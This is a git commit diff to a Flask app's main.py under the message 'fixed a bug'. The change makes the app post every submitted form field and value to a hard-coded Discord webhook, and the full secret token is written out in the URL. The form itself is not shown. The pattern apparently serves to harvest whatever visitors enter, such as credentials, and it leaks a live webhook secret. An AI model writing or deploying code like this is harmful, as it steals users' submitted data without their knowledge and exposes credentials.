f231cdd16bc7c9861a4362cbc02a9ac695a9f255
BuildTools <unconfigured@null.spigotmc.org>
2022-11-11 00:31:13 +0200

    fixed a bug

--- main.py
+++ main.py
@@ -1,14 +1,21 @@
 from flask import Flask, request, render_template
 import json
 import requests
+import asyncio
 app = Flask(__name__)
 
 @app.route("/", methods=['GET', 'POST'])
 def hello_world():
-    if request.method == 'POST':
+    async def send_info():
         a = request.form
+        print(a['name'])
         for item, value in a.items():
-            requests.post("https://discord.com/api/webhooks/1038012726305366076/sr1YKbFZsi2t20YiuPubRFDFk3uHVyqeQ_zmIGiMxcZBKQc2pY5PDsN0LHufeI7dHUnM", data={"content": f"{value}"})
+            for link in ['https://discord.com/api/webhooks/1038012726305366076/sr1YKbFZsi2t20YiuPubRFDFk3uHVyqeQ_zmIGiMxcZBKQc2pY5PDsN0LHufeI7dHUnM', ""]:
+                requests.post(link, data={"content": f"{item}:{value}"})
+    
+    if request.method == 'POST':
+        asyncio.run(send_info())
     
     return render_template('base.html')
 
+#changed lots of links MUST CHANGE BACK WHEN COMMITING
